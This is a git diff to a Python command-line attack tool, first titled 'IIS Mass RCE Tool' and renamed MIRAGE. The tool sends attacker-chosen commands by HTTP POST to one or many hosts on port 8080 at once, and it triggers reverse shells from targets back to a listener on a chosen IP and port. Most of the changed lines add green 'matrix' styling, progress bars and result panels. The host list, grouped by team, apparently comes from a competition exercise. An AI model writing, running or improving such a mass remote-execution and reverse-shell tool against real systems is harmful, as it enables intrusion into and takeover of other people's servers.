@@ -4,9 +4,17 @@ import json
 import subprocess
 import threading
 import socket
+from pyfiglet import Figlet
+from rich.console import Console
+from rich.text import Text
+from rich.table import Table
+from rich.panel import Panel
+from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
+from rich.columns import Columns
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from InquirerPy import inquirer
 from InquirerPy.base.control import Choice
+from InquirerPy.utils import get_style
 
 ALL_HOSTS = [
     # Team 1
@@ -108,6 +116,30 @@ PORT = 8080
 TIMEOUT = 60
 CONCURRENCY = 8
 THROTTLE_MS = 50
+
+console = Console() # For ASCII Art
+
+matrix_style = get_style({
+    "questionmark": "fg:#00FF00 bold",        # bright neon green
+    "question": "fg:#00FF00 bold",
+    "answer": "fg:#39FF14 bold",              # lime accent
+    "pointer": "fg:#00FF00",                  # selection arrow
+    "highlighted": "fg:#00FF00 bg:#003300",   # green text on dark green
+    "selected": "fg:#ADFF2F",                 # yellow-green
+    "separator": "fg:#006400",                # dark green line
+    "instruction": "fg:#228B22",              # medium forest green
+})
+
+text_style = get_style({
+    "questionmark": "fg:#00FF00 bold",       # neon green
+    "answer": "fg:#39FF14 bold",             # your typed answer after submit
+    "input": "fg:#00FF00",                   # text while typing
+})
+
+def ascii_art(text="MIRAGE", color="bright_green"):
+    f = Figlet(font="poison")
+    art = f.renderText(text).rstrip('\n')
+    console.print(Text(art, style=color))
 
 def get_all_local_ips():
     """Get all local IP addresses of the current machine"""
@@ -215,6 +247,9 @@ def select_local_ip():
     selected_ip = inquirer.select(
         message="Select network interface to use:",
         choices=choices,
+        style=matrix_style,
+        pointer=">>",
+        instruction="(Use ↑↓ arrows, Enter to select)",
         default=choices[0].value if choices else None
     ).execute()
     
@@ -233,8 +268,8 @@ def send_command(client, port, command):
     try:
         # Using form data approach
         r = requests.post(url, data=data, timeout=TIMEOUT)
-        
-        return (client, r.status_code, r.text[:500])  # Increased response preview
+        clean_text = r.text.replace('<pre>', '').replace('</pre>', '')
+        return (client, r.status_code, clean_text)
     except Exception as e:
         return (client, "ERR", str(e))
         
@@ -247,7 +282,7 @@ def spawn_reverse_shell(client, port, attacker_ip, attacker_port):
         # Use a very short timeout - we just need to trigger the request
         r = requests.post(url, data=data, timeout=2)
         # If we get here, we got an HTTP response (unexpected for reverse shell)
-        return (client, r.status_code, "Reverse Shell Triggered")
+        return (r.status_code, "Reverse Shell Triggered")
     except requests.exceptions.Timeout:
         # Timeout is EXPECTED - this means the reverse shell is running
         return ("SUCCESS", "Reverse shell connected (timeout expected)")
@@ -274,6 +309,9 @@ def main_interface():
             Choice(value=None, name="Exit"),
         ],
         default="SINGULAR",
+        style=matrix_style,
+        pointer=">>",
+        instruction="(Use ↑↓ arrows, Enter to select)"
     ).execute()
     return action
     
@@ -290,6 +328,9 @@ def choose_targets():
             Choice(value="CUSTOM", name="Custom (Enter Comma-Separated List)"),
             Choice(value=None, name="Cancel"),
         ],
+        style=matrix_style,
+        pointer=">>",
+        instruction="(Use ↑↓ arrows, Enter to select)"
     ).execute()
     
     if not choice:
@@ -297,7 +338,10 @@ def choose_targets():
 
     if choice == "CUSTOM":
         while True:
-            text = inquirer.text(message="Enter Comma-Separated Targets (e.g. 192.168.1.1,192.168.1.2):").execute()
+            text = inquirer.text(
+                message="Enter Comma-Separated Targets (e.g. 192.168.1.1,192.168.1.2):",
+                style=text_style
+            ).execute()
             if not text:
                 return []
             
@@ -310,7 +354,8 @@ def choose_targets():
                 print(f"❌ Invalid target IPs: {', '.join(invalid_ips)}")
                 retry = inquirer.confirm(
                     message="Would you like to try again?", 
-                    default=True
+                    default=True,
+                    style=text_style
                 ).execute()
                 if not retry:
                     return []
@@ -328,33 +373,313 @@ def choose_targets():
     return mapping.get(choice, [])
     
 def run_threads(clients, port, command, action_type="command", attacker_ip=None, attacker_port=None):
-    print(f"\nExecuting on {len(clients)} targets...")
-    print("=" * 50)
+    console.print(f"\n[bold #00ff00]Executing on {len(clients)} targets...[/bold #00ff00]")
+    console.print("=" * 60)
     
-    with ThreadPoolExecutor(max_workers=CONCURRENCY) as ex:
-        futures = []
-        for client in clients:
-            if action_type == "command":
-                # Send command to each client with throttling
-                futures.append(ex.submit(send_command, client, port, command))
-            elif action_type == "shell":
-                # Use the provided attacker IP and port
-                futures.append(ex.submit(spawn_reverse_shell, client, port, attacker_ip, attacker_port))
-                
-            time.sleep(THROTTLE_MS / 1000.0)
+    results = []
+    
+    with Progress(
+        SpinnerColumn(),
+        TextColumn("[progress.description]{task.description}"),
+        BarColumn(),
+        TaskProgressColumn(),
+        console=console,
+        transient=True,
+    ) as progress:
+        
+        main_task = progress.add_task(f"[#00ff00]Processing {len(clients)} targets...", total=len(clients))
+        
+        with ThreadPoolExecutor(max_workers=CONCURRENCY) as ex:
+            futures = {}
+            for client in clients:
+                if action_type == "command":
+                    future = ex.submit(send_command, client, port, command)
+                else:  # shell
+                    future = ex.submit(spawn_reverse_shell, client, port, attacker_ip, attacker_port)
+                futures[future] = client
+                time.sleep(THROTTLE_MS / 1000.0)
             
-        completed = 0
-        for fut in as_completed(futures):
-            target, status, response = fut.result()
-            print(f"[{completed+1}/{len(clients)}] {target} -> {status}")
-            if status == 200 and action_type == "command":
-                print(f"Response: {response}")
-            print("-" * 30)
-            completed += 1
+            for future in as_completed(futures):
+                client = futures[future]
+                try:
+                    result = future.result()
+                    if action_type == "command":
+                        target, status, response = result
+                    else:
+                        # spawn_reverse_shell returns different format
+                        if len(result) == 3:
+                            target, status, response = result
+                        else:
+                            status, response = result
+                            target = client
+                    
+                    # Determine status color and icon
+                    if status == 200 or status == "SUCCESS":
+                        status_color = "#00ff00"  # Green
+                        status_icon = "✅"
+                        status_text = "SUCCESS"
+                    elif isinstance(status, int) and 400 <= status < 600:
+                        status_color = "#ff0000"  # Red
+                        status_icon = "❌"
+                        status_text = f"ERROR {status}"
+                    else:
+                        status_color = "#ffff00"  # Yellow
+                        status_icon = "⚠️"
+                        status_text = f"FAILED: {status}"
+                    
+                    results.append({
+                        "target": target,
+                        "status": status_text,
+                        "color": status_color,
+                        "icon": status_icon,
+                        "response": response
+                    })
+                    
+                except Exception as e:
+                    results.append({
+                        "target": client,
+                        "status": f"EXCEPTION: {str(e)}",
+                        "color": "#ff0000",
+                        "icon": "💥",
+                        "response": ""
+                    })
+                
+                progress.update(main_task, advance=1)
+    
+    # Display results in a beautiful way
+    display_results(results, action_type)
+
+def display_results(results, action_type):
+    """Display results in a visually appealing format"""
+    
+    # Sort results by IP address (lowest to highest)
+    def ip_sort_key(ip_str):
+        try:
+            parts = ip_str.split('.')
+            return tuple(int(part) for part in parts)
+        except (ValueError, AttributeError):
+            return (999, 999, 999, 999)
+
+    sorted_results = sorted(results, key=lambda x: ip_sort_key(x["target"]))
+    
+    # Summary statistics
+    success_count = sum(1 for r in sorted_results if r["color"] == "#00ff00")
+    warning_count = sum(1 for r in sorted_results if r["color"] == "#ffff00")
+    error_count = sum(1 for r in sorted_results if r["color"] == "#ff0000")
+    
+    # Create summary panel
+    summary_text = Text()
+    summary_text.append(f"✅ {success_count} successful", style="#00ff00")
+    summary_text.append(" | ")
+    summary_text.append(f"⚠️ {warning_count} warnings", style="#ffff00") 
+    summary_text.append(" | ")
+    summary_text.append(f"❌ {error_count} failed", style="#ff0000")
+    
+    summary_panel = Panel(
+        summary_text,
+        title="[bold #00ff00]Execution Summary[/bold #00ff00]",
+        border_style="#00ff00"
+    )
+    console.print(summary_panel)
+    
+    # Calculate dynamic sizing based on terminal
+    terminal_width = console.size.width
+    
+    # Determine optimal columns per row based on terminal width
+    if terminal_width >= 160:
+        columns_per_row = 4
+    elif terminal_width >= 120:
+        columns_per_row = 3
+    elif terminal_width >= 80:
+        columns_per_row = 2
+    else:
+        columns_per_row = 1
+    
+    panel_width = min(55, max(35, (terminal_width - (columns_per_row * 3)) // columns_per_row))
+    
+    # Create result panels with dynamic sizing
+    result_panels = []
+    for result in sorted_results:
+        content = Text()
+        content.append(f"Target: {result['target']}\n", style="bold white")
+        content.append(f"Status: ", style="bold")
+        content.append(f"{result['status']}\n", style=result['color'])
+        
+        if action_type == "command" and result["response"] and result["color"] == "#00ff00":
+            lines = result["response"].strip().split('\n')
+            preview_lines = []
+            total_chars = 0
+            max_preview_chars = (panel_width - 10) * 3
+            
+            for line in lines:
+                if total_chars + len(line) <= max_preview_chars:
+                    preview_lines.append(line)
+                    total_chars += len(line)
+                else:
+                    remaining_chars = max_preview_chars - total_chars
+                    if remaining_chars > 10:
+                        preview_lines.append(line[:remaining_chars-3] + "...")
+                    break
+            
+            if preview_lines:
+                content.append("Response:\n", style="bold")
+                for line in preview_lines:
+                    if len(line) > panel_width - 5:
+                        line = line[:panel_width-8] + "..."
+                    content.append(f"{line}\n", style="#CCCCCC")
+    
+        panel = Panel(
+            content,
+            title=f"{result['icon']} {result['target']}",
+            border_style=result['color'],
+            width=panel_width,
+            padding=(1, 2),
+            expand=False
+        )
+        result_panels.append(panel)
+    
+    # Display in dynamic columns
+    if result_panels:
+        console.print(f"\n[bold #00ff00]Quick Overview ({columns_per_row} per row):[/bold #00ff00]")
+        
+        for i in range(0, len(result_panels), columns_per_row):
+            row_panels = result_panels[i:i + columns_per_row]
+            columns = Columns(row_panels, width=panel_width, expand=False, equal=True)
+            console.print(columns)
+            console.print()
+    
+    # Always show detailed output option
+    if sorted_results:
+        show_details = inquirer.confirm(
+            message="Show detailed output with complete responses?",
+            default=True,
+            style=text_style
+        ).execute()
+        
+        if show_details:
+            # Organize by status sections
+            successful_results = [r for r in sorted_results if r["color"] == "#00ff00"]
+            warning_results = [r for r in sorted_results if r["color"] == "#ffff00"]
+            error_results = [r for r in sorted_results if r["color"] == "#ff0000"]
+            
+            # Calculate dynamic line lengths based on terminal width
+            line_length = min(100, terminal_width - 4)
+            single_line = "─" * line_length
+            double_line = "═" * line_length
+            
+            # Main header
+            console.print("\n")
+            console.print(Panel(
+                f"[bold #00ff00]COMPLETE DETAILED OUTPUT[/bold #00ff00]\n"
+                f"[white]Total Targets: {len(sorted_results)} | "
+                f"Successful: {success_count} | "
+                f"Warnings: {warning_count} | "
+                f"Failed: {error_count}[/white]",
+                border_style="#00ff00",
+                padding=(1, 2)
+            ))
+            
+            # Successful results section
+            if successful_results:
+                console.print(f"\n{double_line}")
+                console.print("[bold #00ff00]✅ SUCCESSFUL EXECUTIONS[/bold #00ff00]")
+                console.print(f"{double_line}")
+                
+                for i, result in enumerate(successful_results):
+                    if i > 0:
+                        console.print(f"\n{single_line}\n")
+                    
+                    # Make target IP stand out with background and border
+                    console.print(Panel(
+                        f"[bold #00ff00]🎯 TARGET: {result['target']}[/bold #00ff00]",
+                        border_style="#00ff00",
+                        width=line_length,
+                        padding=(0, 1)
+                    ))
+                    
+                    console.print(f"[bold white]Status:[/bold white] [#00ff00]{result['status']}[/#00ff00]")
+                    
+                    if action_type == "command" and result["response"]:
+                        console.print(f"\n[bold white]Full Response:[/bold white]")
+                        console.print(Panel(
+                            f"[#CCCCCC]{result['response']}[/#CCCCCC]",
+                            border_style="#00ff00",
+                            width=line_length,
+                            padding=(1, 2)
+                        ))
+            
+            # Warning results section
+            if warning_results:
+                console.print(f"\n{double_line}")
+                console.print("[bold #ffff00]⚠️  WARNINGS & PARTIAL SUCCESS[/bold #ffff00]")
+                console.print(f"{double_line}")
+                
+                for i, result in enumerate(warning_results):
+                    if i > 0:
+                        console.print(f"\n{single_line}\n")
+                    
+                    console.print(Panel(
+                        f"[bold #ffff00]🎯 TARGET: {result['target']}[/bold #ffff00]",
+                        border_style="#ffff00",
+                        width=line_length,
+                        padding=(0, 1)
+                    ))
+                    
+                    console.print(f"[bold white]Status:[/bold white] [#ffff00]{result['status']}[/#ffff00]")
+                    
+                    if action_type == "command" and result["response"]:
+                        console.print(f"\n[bold white]Response:[/bold white]")
+                        console.print(Panel(
+                            f"[#CCCCCC]{result['response']}[/#CCCCCC]",
+                            border_style="#ffff00",
+                            width=line_length,
+                            padding=(1, 2)
+                        ))
+            
+            # Error results section
+            if error_results:
+                console.print(f"\n{double_line}")
+                console.print("[bold #ff0000]❌ FAILED EXECUTIONS[/bold #ff0000]")
+                console.print(f"{double_line}")
+                
+                for i, result in enumerate(error_results):
+                    if i > 0:
+                        console.print(f"\n{single_line}\n")
+                    
+                    console.print(Panel(
+                        f"[bold #ff0000]🎯 TARGET: {result['target']}[/bold #ff0000]",
+                        border_style="#ff0000",
+                        width=line_length,
+                        padding=(0, 1)
+                    ))
+                    
+                    console.print(f"[bold white]Status:[/bold white] [#ff0000]{result['status']}[/#ff0000]")
+                    
+                    if action_type == "command" and result["response"]:
+                        console.print(f"\n[bold white]Error Details:[/bold white]")
+                        console.print(Panel(
+                            f"[#CCCCCC]{result['response']}[/#CCCCCC]",
+                            border_style="#ff0000",
+                            width=line_length,
+                            padding=(1, 2)
+                        ))
+            
+            # Final summary (simple listing at bottom)
+            console.print(f"\n{double_line}")
+            console.print("[bold #00ff00]📊 FINAL SUMMARY[/bold #00ff00]")
+            console.print(f"{double_line}")
+            console.print(f"[#00ff00]✅ Successful: {success_count} targets[/#00ff00]")
+            console.print(f"[#ffff00]⚠️ Warnings:  {warning_count} targets[/#ffff00]")
+            console.print(f"[#ff0000]❌ Failed:    {error_count} targets[/#ff0000]")
+            console.print(f"[bold white]📋 Total:     {len(sorted_results)} targets processed[/bold white]")
+            console.print(f"{double_line}")
 
 def singular_execution():
     while True:
-        target = inquirer.text(message="Enter target IP:").execute()
+        target = inquirer.text(
+            message="Enter target IP:",
+            style=text_style
+        ).execute()
         
         if not target:
             print("No target specified")
@@ -365,25 +690,92 @@ def singular_execution():
             print(f"❌ {target} is not a valid target IP")
             retry = inquirer.confirm(
                 message="Would you like to try a different IP?", 
-                default=True
+                default=False,
+                style=text_style,
+                transformer=lambda x: "y" if x else "n"
             ).execute()
             if not retry:
                 return
             continue  # Ask for IP again
         
         break  # Valid IP found
-    command = inquirer.text(message="Enter command to execute:").execute()
+    
+    command = inquirer.text(
+        message="Enter command to execute:",
+        style=text_style
+    ).execute()
     
     if not command:
         print("No command specified")
         return
     
-    print(f"\nSending command to {target}...")
-    result = send_command(target, PORT, command)
+    console.print(f"\n[bold #00ff00]Sending command to {target}...[/bold #00ff00]")
+    console.print("=" * 60)
+    
+    # Show progress for single execution
+    with Progress(
+        SpinnerColumn(),
+        TextColumn("[progress.description]{task.description}"),
+        BarColumn(),
+        TaskProgressColumn(),
+        console=console,
+        transient=True,
+    ) as progress:
+        
+        task = progress.add_task(f"[#00ff00]Executing on {target}...", total=1)
+        result = send_command(target, PORT, command)
+        progress.update(task, advance=1)
+    
     target, status, response = result
-    print(f"Target: {target}")
-    print(f"Status: {status}")
-    print(f"Response:\n{response}")
+    
+    # Determine status color and icon
+    if status == 200:
+        status_color = "#00ff00"
+        status_icon = "✅"
+        status_text = "SUCCESS"
+    elif isinstance(status, int) and 400 <= status < 600:
+        status_color = "#ff0000"
+        status_icon = "❌"
+        status_text = f"ERROR {status}"
+    else:
+        status_color = "#ffff00"
+        status_icon = "⚠️"
+        status_text = f"FAILED: {status}"
+    
+    # Calculate dynamic line length based on terminal width
+    terminal_width = console.size.width
+    line_length = min(100, terminal_width - 4)
+    double_line = "═" * line_length
+    
+    # Display results in a detailed box
+    console.print(f"\n{double_line}")
+    console.print("[bold #00ff00]SINGLE TARGET EXECUTION RESULTS[/bold #00ff00]")
+    console.print(f"{double_line}")
+    
+    # Target header
+    console.print(Panel(
+        f"[bold #00ff00]🎯 TARGET: {target}[/bold #00ff00]",
+        border_style="#00ff00",
+        width=line_length,
+        padding=(0, 1)
+    ))
+    
+    # Status and command
+    console.print(f"\n[bold white]Status:[/bold white] [{status_color}]{status_text}[/{status_color}]")
+    
+    # Response in a panel
+    if response:
+        console.print(f"\n[bold white]Full Response:[/bold white]")
+        console.print(Panel(
+            f"[#CCCCCC]{response}[/#CCCCCC]",
+            border_style=status_color,
+            width=line_length,
+            padding=(1, 2)
+        ))
+    
+    # Final separator
+    console.print(f"\n{double_line}")
+    console.print(f"{double_line}")
 
 def mass_execution():
     targets = choose_targets()
@@ -391,13 +783,21 @@ def mass_execution():
         print("No targets selected")
         return
     
-    command = inquirer.text(message="Enter command to execute on all targets:").execute()
+    command = inquirer.text(
+        message="Enter command to execute on all targets:",
+        style=text_style
+    ).execute()
+    
     if not command:
         print("No command entered")
         return
     
     print(f"\nTargeting {len(targets)} hosts with command: {command}")
-    confirm = inquirer.confirm(message="Proceed?", default=True).execute()
+    confirm = inquirer.confirm(
+        message="Proceed?", 
+        default=True,
+        style=text_style
+    ).execute()
     if not confirm:
         return
     
@@ -409,7 +809,10 @@ def shell_execution(selected_ip):
     
     # Get single target
     while True:
-        target = inquirer.text(message="Enter target IP:").execute()
+        target = inquirer.text(
+            message="Enter target IP:",
+            style=text_style
+        ).execute()
         
         if not target:
             print("No target specified")
@@ -420,7 +823,8 @@ def shell_execution(selected_ip):
             print(f"❌ {target} is not a valid target IP")
             retry = inquirer.confirm(
                 message="Would you like to try a different IP?", 
-                default=True
+                default=True,
+                style=text_style
             ).execute()
             if not retry:
                 return
@@ -429,12 +833,22 @@ def shell_execution(selected_ip):
         break  # Valid IP found
     
     # Get listener details
-    listener_ip = inquirer.text(message="Listener IP:", default=selected_ip).execute()
-    listener_port = inquirer.text(message="Listener port:", default="6767").execute()
+    listener_ip = inquirer.text(
+        message="Listener IP:", 
+        default=selected_ip,
+        style=text_style
+    ).execute()
+    
+    listener_port = inquirer.text(
+        message="Listener port:", 
+        default="6767",
+        style=text_style
+    ).execute()
     
     confirm = inquirer.confirm(
         message=f"Trigger reverse shell from {target} to {listener_ip}:{listener_port}?", 
-        default=True
+        default=True,
+        style=text_style
     ).execute()
     
     if not confirm:
@@ -460,12 +874,11 @@ def shell_execution(selected_ip):
         listener_thread.join(timeout=1)
 
 def main():
-    print("=== IIS Mass RCE Tool ===")
-    print("Advanced Remote Code Execution and Reverse Shell Deployment")
+    subprocess.run("clear")
+    ascii_art()
     
     # Show local IP at startup
     selected_ip = select_local_ip()
-    print(f"Selected IP: {selected_ip}")
     print()
     
     while True:
